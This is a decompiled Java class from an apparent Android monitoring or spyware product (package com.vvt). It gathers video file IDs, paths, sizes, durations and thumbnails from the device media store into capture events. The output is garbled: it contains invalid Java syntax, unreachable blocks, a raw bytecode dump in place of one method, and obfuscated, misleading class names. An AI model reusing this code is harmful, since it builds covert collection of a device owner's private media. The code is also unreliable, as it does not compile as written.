package com.vvt.capture.camera.video.b;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import com.vvt.capture.camera.video.c;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxVideoFileThumbnailEvent;
import com.vvt.events.j;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class a
{
  private static final boolean a;
  private static final boolean b;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.ak.a.e;
      return;
    }
  }
  
  public static FxVideoFileThumbnailEvent a(c paramc)
  {
    FxVideoFileThumbnailEvent localFxVideoFileThumbnailEvent = new com/vvt/events/FxVideoFileThumbnailEvent;
    localFxVideoFileThumbnailEvent.<init>();
    long l = paramc.b();
    localFxVideoFileThumbnailEvent.setEventId(l);
    l = paramc.a();
    localFxVideoFileThumbnailEvent.setEventTime(l);
    l = paramc.e();
    localFxVideoFileThumbnailEvent.setActualFileSize(l);
    int i = paramc.f();
    localFxVideoFileThumbnailEvent.setActualDuration(i);
    Object localObject = paramc.c();
    localFxVideoFileThumbnailEvent.setFormat((FxMediaType)localObject);
    l = paramc.b();
    localFxVideoFileThumbnailEvent.setParingId(l);
    i = 0;
    localFxVideoFileThumbnailEvent.setVideoData(null);
    localObject = paramc.g();
    localFxVideoFileThumbnailEvent.setActualFullPath((String)localObject);
    localObject = paramc.d();
    Iterator localIterator = ((ArrayList)localObject).iterator();
    for (;;)
    {
      boolean bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject = (j)localIterator.next();
      localFxVideoFileThumbnailEvent.addThumbnail((j)localObject);
    }
    return localFxVideoFileThumbnailEvent;
  }
  
  public static List a(ContentResolver paramContentResolver, Uri paramUri)
  {
    localObject1 = null;
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if (paramUri == null) {}
    for (;;)
    {
      try
      {
        NullPointerException localNullPointerException1 = new java/lang/NullPointerException;
        localObject4 = "url can not be null";
        localNullPointerException1.<init>((String)localObject4);
        throw localNullPointerException1;
      }
      catch (Exception localException1)
      {
        localException1 = localException1;
        bool1 = false;
        NullPointerException localNullPointerException2 = null;
        try
        {
          bool2 = b;
          if ((!bool2) || (localNullPointerException2 != null)) {
            localNullPointerException2.close();
          }
          bool1 = a;
          if (bool1) {}
          return localArrayList;
        }
        finally
        {
          for (;;)
          {
            boolean bool2;
            String[] arrayOfString;
            boolean bool3;
            localObject1 = localObject3;
            Object localObject3 = localObject5;
          }
        }
        if (paramContentResolver != null) {
          break label121;
        }
        localNullPointerException2 = new java/lang/NullPointerException;
        localObject4 = "contentResolver can not be null";
        localNullPointerException2.<init>((String)localObject4);
        throw localNullPointerException2;
      }
      finally {}
      if (localObject1 != null) {
        ((Cursor)localObject1).close();
      }
      throw ((Throwable)localObject2);
      label121:
      bool1 = true;
      arrayOfString = new String[bool1];
      bool1 = false;
      localObject3 = null;
      Object localObject4 = "_id";
      arrayOfString[0] = localObject4;
      localObject3 = paramContentResolver;
      localObject4 = paramUri;
      localObject3 = paramContentResolver.query(paramUri, arrayOfString, null, null, null);
      if (localObject3 != null)
      {
        try
        {
          for (;;)
          {
            bool2 = ((Cursor)localObject3).moveToNext();
            if (!bool2) {
              break;
            }
            localObject4 = "_id";
            int i = ((Cursor)localObject3).getColumnIndex((String)localObject4);
            long l = ((Cursor)localObject3).getLong(i);
            localObject4 = Long.valueOf(l);
            localArrayList.add(localObject4);
          }
        }
        catch (Exception localException2) {}
      }
      else
      {
        bool3 = b;
        if ((bool3) && (localObject3 == null)) {}
      }
    }
  }
  
  public static List a(ContentResolver paramContentResolver, Uri paramUri, int paramInt)
  {
    localObject1 = null;
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if (paramUri == null) {}
    for (;;)
    {
      try
      {
        NullPointerException localNullPointerException1 = new java/lang/NullPointerException;
        localObject4 = "url can not be null";
        localNullPointerException1.<init>((String)localObject4);
        throw localNullPointerException1;
      }
      catch (Exception localException1)
      {
        localException1 = localException1;
        bool1 = false;
        NullPointerException localNullPointerException2 = null;
        try
        {
          bool2 = b;
          if ((!bool2) || (localNullPointerException2 != null)) {
            localNullPointerException2.close();
          }
          bool1 = a;
          if (bool1) {}
          return localArrayList;
        }
        finally
        {
          for (;;)
          {
            boolean bool2;
            int i;
            String[] arrayOfString;
            String str;
            boolean bool3;
            localObject1 = localObject3;
            Object localObject3 = localObject5;
          }
        }
        if (paramContentResolver != null) {
          break label126;
        }
        localNullPointerException2 = new java/lang/NullPointerException;
        localObject4 = "contentResolver can not be null";
        localNullPointerException2.<init>((String)localObject4);
        throw localNullPointerException2;
      }
      finally {}
      if (localObject1 != null) {
        ((Cursor)localObject1).close();
      }
      throw ((Throwable)localObject2);
      label126:
      i = -1;
      if (paramInt == i) {
        paramInt = -1 >>> 1;
      }
      i = 1;
      arrayOfString = new String[i];
      i = 0;
      localObject3 = null;
      Object localObject4 = "_id";
      arrayOfString[0] = localObject4;
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject4 = "_id DESC LIMIT ";
      localObject3 = ((StringBuilder)localObject3).append((String)localObject4);
      localObject3 = ((StringBuilder)localObject3).append(paramInt);
      str = ((StringBuilder)localObject3).toString();
      localObject3 = paramContentResolver;
      localObject4 = paramUri;
      localObject3 = paramContentResolver.query(paramUri, arrayOfString, null, null, str);
      if (localObject3 != null)
      {
        try
        {
          for (;;)
          {
            bool2 = ((Cursor)localObject3).moveToNext();
            if (!bool2) {
              break;
            }
            localObject4 = "_id";
            int j = ((Cursor)localObject3).getColumnIndex((String)localObject4);
            long l = ((Cursor)localObject3).getLong(j);
            localObject4 = Long.valueOf(l);
            localArrayList.add(localObject4);
          }
        }
        catch (Exception localException2) {}
      }
      else
      {
        bool3 = b;
        if ((bool3) && (localObject3 == null)) {}
      }
    }
  }
  
  /* Error */
  private static List a(String paramString, ContentResolver paramContentResolver, Uri paramUri, long paramLong)
  {
    // Byte code:
    //   0: getstatic 13	com/vvt/capture/camera/video/removeFromPath/a:a	Z
    //   3: istore 5
    //   5: iload 5
    //   7: ifeq +3 -> 10
    //   10: aload_1
    //   11: ifnonnull +18 -> 29
    //   14: new 103	java/lang/NullPointerException
    //   17: astore 6
    //   19: aload 6
    //   21: ldc 114
    //   23: invokespecial 107	java/lang/NullPointerException:<init>	(Ljava/lang/String;)V
    //   26: aload 6
    //   28: athrow
    //   29: new 80	java/util/ArrayList
    //   32: astore 7
    //   34: aload 7
    //   36: invokespecial 101	java/util/ArrayList:<init>	()V
    //   39: iconst_2
    //   40: istore 8
    //   42: iload 8
    //   44: anewarray 4	java/lang/Object
    //   47: astore 9
    //   49: aload 9
    //   51: iconst_0
    //   52: ldc 118
    //   54: aastore
    //   55: lload_3
    //   56: invokestatic 141	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   59: astore 10
    //   61: aload 9
    //   63: iconst_1
    //   64: aload 10
    //   66: aastore
    //   67: ldc -90
    //   69: aload 9
    //   71: invokestatic 171	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   74: astore 10
    //   76: iconst_0
    //   77: istore 11
    //   79: aconst_null
    //   80: astore 12
    //   82: iconst_0
    //   83: istore 13
    //   85: aconst_null
    //   86: astore 14
    //   88: iconst_0
    //   89: istore 15
    //   91: aconst_null
    //   92: astore 16
    //   94: aload_1
    //   95: astore 6
    //   97: aload_2
    //   98: astore 9
    //   100: aload_1
    //   101: aload_2
    //   102: aconst_null
    //   103: aload 10
    //   105: aconst_null
    //   106: aconst_null
    //   107: invokevirtual 124	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   110: astore 6
    //   112: aload 6
    //   114: ifnull +498 -> 612
    //   117: iconst_0
    //   118: istore 8
    //   120: aconst_null
    //   121: astore 9
    //   123: iconst_0
    //   124: newarray <illegal type>
    //   126: astore 10
    //   128: aload 6
    //   130: invokeinterface 127 1 0
    //   135: istore 8
    //   137: iload 8
    //   139: ifeq +483 -> 622
    //   142: ldc 118
    //   144: astore 9
    //   146: aload 6
    //   148: aload 9
    //   150: invokeinterface 174 2 0
    //   155: istore 8
    //   157: aload 6
    //   159: iload 8
    //   161: invokeinterface 178 2 0
    //   166: istore 15
    //   168: ldc -76
    //   170: astore 9
    //   172: aload 6
    //   174: aload 9
    //   176: invokeinterface 174 2 0
    //   181: istore 8
    //   183: aload 6
    //   185: iload 8
    //   187: invokeinterface 184 2 0
    //   192: astore 16
    //   194: ldc -70
    //   196: astore 9
    //   198: aload 6
    //   200: aload 9
    //   202: invokeinterface 174 2 0
    //   207: istore 8
    //   209: aload 6
    //   211: iload 8
    //   213: invokeinterface 184 2 0
    //   218: astore 9
    //   220: ldc -68
    //   222: astore 14
    //   224: aload 6
    //   226: aload 14
    //   228: invokeinterface 174 2 0
    //   233: istore 13
    //   235: aload 6
    //   237: iload 13
    //   239: invokeinterface 178 2 0
    //   244: istore 11
    //   246: aload 9
    //   248: invokestatic 193	com/vvt/events/f:a	(Ljava/lang/String;)Lcom/vvt/events/FxMediaType;
    //   251: astore 17
    //   253: new 195	java/util/Date
    //   256: astore 9
    //   258: aload 9
    //   260: invokespecial 196	java/util/Date:<init>	()V
    //   263: aload 9
    //   265: invokevirtual 199	java/util/Date:getTime	()J
    //   268: lstore 18
    //   270: ldc -55
    //   272: astore 9
    //   274: aload 6
    //   276: aload 9
    //   278: invokeinterface 174 2 0
    //   283: istore 8
    //   285: aload 6
    //   287: iload 8
    //   289: invokeinterface 135 2 0
    //   294: lstore 20
    //   296: aload 16
    //   298: invokestatic 207	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   301: astore 16
    //   303: getstatic 13	com/vvt/capture/camera/video/removeFromPath/a:a	Z
    //   306: istore 22
    //   308: iload 22
    //   310: ifeq +3 -> 313
    //   313: aload 16
    //   315: invokestatic 210	com/vvt/io/d:e	(Ljava/lang/String;)Z
    //   318: istore 22
    //   320: iload 22
    //   322: ifne +16 -> 338
    //   325: getstatic 13	com/vvt/capture/camera/video/removeFromPath/a:a	Z
    //   328: istore 8
    //   330: iload 8
    //   332: ifeq -204 -> 128
    //   335: goto -207 -> 128
    //   338: lconst_0
    //   339: lstore 23
    //   341: lload 20
    //   343: lload 23
    //   345: lcmp
    //   346: istore 22
    //   348: iload 22
    //   350: ifgt +22 -> 372
    //   353: new 212	java/io/File
    //   356: astore 9
    //   358: aload 9
    //   360: aload 16
    //   362: invokespecial 213	java/io/File:<init>	(Ljava/lang/String;)V
    //   365: aload 9
    //   367: invokevirtual 216	java/io/File:length	()J
    //   370: lstore 20
    //   372: lconst_0
    //   373: lstore 23
    //   375: lload 20
    //   377: lload 23
    //   379: lcmp
    //   380: istore 22
    //   382: iload 22
    //   384: ifgt +16 -> 400
    //   387: getstatic 13	com/vvt/capture/camera/video/removeFromPath/a:a	Z
    //   390: istore 8
    //   392: iload 8
    //   394: ifeq -266 -> 128
    //   397: goto -269 -> 128
    //   400: new 26	com/vvt/capture/camera/video/MyUncaughtExceptionHandler
    //   403: astore 25
    //   405: aload 25
    //   407: invokespecial 217	com/vvt/capture/camera/video/MyUncaughtExceptionHandler:<init>	()V
    //   410: aload 25
    //   412: lload 18
    //   414: invokevirtual 219	com/vvt/capture/camera/video/MyUncaughtExceptionHandler:a	(J)V
    //   417: aload 25
    //   419: lload 20
    //   421: invokevirtual 221	com/vvt/capture/camera/video/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	(J)V
    //   424: aload 25
    //   426: aload 17
    //   428: invokevirtual 223	com/vvt/capture/camera/video/MyUncaughtExceptionHandler:a	(Lcom/vvt/events/FxMediaType;)V
    //   431: iload 15
    //   433: i2l
    //   434: lstore 20
    //   436: aload 25
    //   438: lload 20
    //   440: invokevirtual 225	com/vvt/capture/camera/video/MyUncaughtExceptionHandler:removeFromPath	(J)V
    //   443: iload 11
    //   445: sipush 1000
    //   448: idiv
    //   449: istore 8
    //   451: aload 25
    //   453: iload 8
    //   455: invokevirtual 227	com/vvt/capture/camera/video/MyUncaughtExceptionHandler:a	(I)V
    //   458: aload 25
    //   460: aload 16
    //   462: invokevirtual 229	com/vvt/capture/camera/video/MyUncaughtExceptionHandler:a	(Ljava/lang/String;)V
    //   465: iload 15
    //   467: i2l
    //   468: lstore 20
    //   470: sipush 800
    //   473: istore 15
    //   475: aload_0
    //   476: lload 20
    //   478: aload_1
    //   479: iload 15
    //   481: invokestatic 235	com/vvt/io/o:removeFromPath	(Ljava/lang/String;JLandroid/content/ContentResolver;I)Ljava/lang/String;
    //   484: astore 9
    //   486: getstatic 13	com/vvt/capture/camera/video/removeFromPath/a:a	Z
    //   489: istore 13
    //   491: iload 13
    //   493: ifeq +3 -> 496
    //   496: getstatic 13	com/vvt/capture/camera/video/removeFromPath/a:a	Z
    //   499: istore 13
    //   501: iload 13
    //   503: ifeq +3 -> 506
    //   506: aload 9
    //   508: invokestatic 239	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   511: istore 13
    //   513: iload 13
    //   515: ifne +84 -> 599
    //   518: new 96	com/vvt/events/j
    //   521: astore 14
    //   523: aload 14
    //   525: invokespecial 240	com/vvt/events/j:<init>	()V
    //   528: aload 14
    //   530: aload 10
    //   532: invokevirtual 242	com/vvt/events/j:a	([B)V
    //   535: aload 14
    //   537: aload 9
    //   539: invokevirtual 243	com/vvt/events/j:a	(Ljava/lang/String;)V
    //   542: aload 25
    //   544: aload 14
    //   546: invokevirtual 245	com/vvt/capture/camera/video/MyUncaughtExceptionHandler:a	(Lcom/vvt/events/j;)V
    //   549: aload 7
    //   551: aload 25
    //   553: invokeinterface 147 2 0
    //   558: pop
    //   559: goto -431 -> 128
    //   562: astore 9
    //   564: getstatic 18	com/vvt/capture/camera/video/removeFromPath/a:removeFromPath	Z
    //   567: istore 8
    //   569: iload 8
    //   571: ifeq +3 -> 574
    //   574: aload 6
    //   576: ifnull +10 -> 586
    //   579: aload 6
    //   581: invokeinterface 112 1 0
    //   586: getstatic 13	com/vvt/capture/camera/video/removeFromPath/a:a	Z
    //   589: istore 5
    //   591: iload 5
    //   593: ifeq +3 -> 596
    //   596: aload 7
    //   598: areturn
    //   599: getstatic 13	com/vvt/capture/camera/video/removeFromPath/a:a	Z
    //   602: istore 8
    //   604: iload 8
    //   606: ifeq -57 -> 549
    //   609: goto -60 -> 549
    //   612: getstatic 18	com/vvt/capture/camera/video/removeFromPath/a:removeFromPath	Z
    //   615: istore 8
    //   617: iload 8
    //   619: ifeq +3 -> 622
    //   622: aload 6
    //   624: ifnull -38 -> 586
    //   627: goto -48 -> 579
    //   630: astore 6
    //   632: aload 12
    //   634: ifnull +10 -> 644
    //   637: aload 12
    //   639: invokeinterface 112 1 0
    //   644: aload 6
    //   646: athrow
    //   647: astore 9
    //   649: aload 6
    //   651: astore 12
    //   653: aload 9
    //   655: astore 6
    //   657: goto -25 -> 632
    //   660: astore 6
    //   662: iconst_0
    //   663: istore 5
    //   665: aconst_null
    //   666: astore 6
    //   668: goto -104 -> 564
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	671	0	paramString	String
    //   0	671	1	paramContentResolver	ContentResolver
    //   0	671	2	paramUri	Uri
    //   0	671	3	paramLong	long
    //   3	661	5	bool1	boolean
    //   17	606	6	localObject1	Object
    //   630	20	6	localObject2	Object
    //   655	1	6	localObject3	Object
    //   660	1	6	localException1	Exception
    //   666	1	6	localObject4	Object
    //   32	565	7	localArrayList	ArrayList
    //   40	79	8	i	int
    //   135	3	8	bool2	boolean
    //   155	133	8	j	int
    //   328	65	8	bool3	boolean
    //   449	5	8	k	int
    //   567	51	8	bool4	boolean
    //   47	491	9	localObject5	Object
    //   562	1	9	localException2	Exception
    //   647	7	9	localObject6	Object
    //   59	472	10	localObject7	Object
    //   77	372	11	m	int
    //   80	572	12	localObject8	Object
    //   83	155	13	n	int
    //   489	25	13	bool5	boolean
    //   86	459	14	localObject9	Object
    //   89	391	15	i1	int
    //   92	369	16	str	String
    //   251	176	17	localFxMediaType	FxMediaType
    //   268	145	18	l1	long
    //   294	183	20	l2	long
    //   306	77	22	bool6	boolean
    //   339	39	23	l3	long
    //   403	149	25	localc	MyUncaughtExceptionHandler
    // Exception table:
    //   from	to	target	type
    //   123	126	562	java/lang/Exception
    //   128	135	562	java/lang/Exception
    //   148	155	562	java/lang/Exception
    //   159	166	562	java/lang/Exception
    //   174	181	562	java/lang/Exception
    //   185	192	562	java/lang/Exception
    //   200	207	562	java/lang/Exception
    //   211	218	562	java/lang/Exception
    //   226	233	562	java/lang/Exception
    //   237	244	562	java/lang/Exception
    //   246	251	562	java/lang/Exception
    //   253	256	562	java/lang/Exception
    //   258	263	562	java/lang/Exception
    //   263	268	562	java/lang/Exception
    //   276	283	562	java/lang/Exception
    //   287	294	562	java/lang/Exception
    //   296	301	562	java/lang/Exception
    //   303	306	562	java/lang/Exception
    //   313	318	562	java/lang/Exception
    //   325	328	562	java/lang/Exception
    //   353	356	562	java/lang/Exception
    //   360	365	562	java/lang/Exception
    //   365	370	562	java/lang/Exception
    //   387	390	562	java/lang/Exception
    //   400	403	562	java/lang/Exception
    //   405	410	562	java/lang/Exception
    //   412	417	562	java/lang/Exception
    //   419	424	562	java/lang/Exception
    //   426	431	562	java/lang/Exception
    //   438	443	562	java/lang/Exception
    //   445	449	562	java/lang/Exception
    //   453	458	562	java/lang/Exception
    //   460	465	562	java/lang/Exception
    //   479	484	562	java/lang/Exception
    //   486	489	562	java/lang/Exception
    //   496	499	562	java/lang/Exception
    //   506	511	562	java/lang/Exception
    //   518	521	562	java/lang/Exception
    //   523	528	562	java/lang/Exception
    //   530	535	562	java/lang/Exception
    //   537	542	562	java/lang/Exception
    //   544	549	562	java/lang/Exception
    //   551	559	562	java/lang/Exception
    //   599	602	562	java/lang/Exception
    //   612	615	562	java/lang/Exception
    //   106	110	630	finally
    //   123	126	647	finally
    //   128	135	647	finally
    //   148	155	647	finally
    //   159	166	647	finally
    //   174	181	647	finally
    //   185	192	647	finally
    //   200	207	647	finally
    //   211	218	647	finally
    //   226	233	647	finally
    //   237	244	647	finally
    //   246	251	647	finally
    //   253	256	647	finally
    //   258	263	647	finally
    //   263	268	647	finally
    //   276	283	647	finally
    //   287	294	647	finally
    //   296	301	647	finally
    //   303	306	647	finally
    //   313	318	647	finally
    //   325	328	647	finally
    //   353	356	647	finally
    //   360	365	647	finally
    //   365	370	647	finally
    //   387	390	647	finally
    //   400	403	647	finally
    //   405	410	647	finally
    //   412	417	647	finally
    //   419	424	647	finally
    //   426	431	647	finally
    //   438	443	647	finally
    //   445	449	647	finally
    //   453	458	647	finally
    //   460	465	647	finally
    //   479	484	647	finally
    //   486	489	647	finally
    //   496	499	647	finally
    //   506	511	647	finally
    //   518	521	647	finally
    //   523	528	647	finally
    //   530	535	647	finally
    //   537	542	647	finally
    //   544	549	647	finally
    //   551	559	647	finally
    //   564	567	647	finally
    //   599	602	647	finally
    //   612	615	647	finally
    //   106	110	660	java/lang/Exception
  }
  
  public static List a(String paramString, ContentResolver paramContentResolver, Uri paramUri, List paramList1, List paramList2)
  {
    boolean bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if ((paramList1 == null) || (paramList2 == null)) {}
    for (Object localObject = localArrayList;; localObject = localArrayList)
    {
      return (List)localObject;
      Iterator localIterator = paramList2.iterator();
      for (;;)
      {
        bool = localIterator.hasNext();
        if (!bool) {
          break;
        }
        long l = ((Long)localIterator.next()).longValue();
        localObject = Long.valueOf(l);
        bool = paramList1.contains(localObject);
        if (!bool)
        {
          localObject = a(paramString, paramContentResolver, paramUri, l);
          localArrayList.addAll((Collection)localObject);
        }
      }
      bool = a;
      if (bool) {}
      bool = a;
      if (!bool) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/camera/video/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */